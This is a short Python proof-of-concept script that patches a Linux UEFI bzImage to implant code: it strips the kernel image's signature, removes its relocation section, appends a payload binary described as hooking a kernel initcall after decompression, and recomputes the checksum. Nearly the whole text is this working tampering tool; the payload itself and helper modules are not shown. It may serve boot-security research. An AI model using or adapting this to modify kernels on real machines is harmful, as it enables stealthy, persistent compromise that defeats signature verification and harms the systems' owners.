"""
PoC to patch a bzImage, only for uefi as we are hooking the the uefi functions
and rely on being able to create more sections.
"""
import sys
from add_data import add_data
from pe import PERemoveSig, PECheckSumFix
from remove_reloc import remove_reloc
from utils import pad


def main():
    a = open(sys.argv[1], 'rb').read()

    # remove the sig
    a = PERemoveSig(a).remove_sig()

    # Remove the reloc section in older kernels
    a = remove_reloc(a)

    # Adding our payload
    # this is the first stage that will patch the kernel after its been
    # decompressed, hooking an initcall and making sure our payload exists in
    # virtual memory.
    payload = open('./src/runtime/all.bin', 'rb').read()
    a = add_data(
        a,
        pad(payload, value=b'\x00')
    )

    # Checksum fixes for sanity
    # need to fix the bzImage checksum. Nothing really checks it, but lets do
    # it for completenes.
    last = PECheckSumFix(a).fix()
    open(sys.argv[2], 'wb').write(last)


if __name__ == "__main__":
    main()
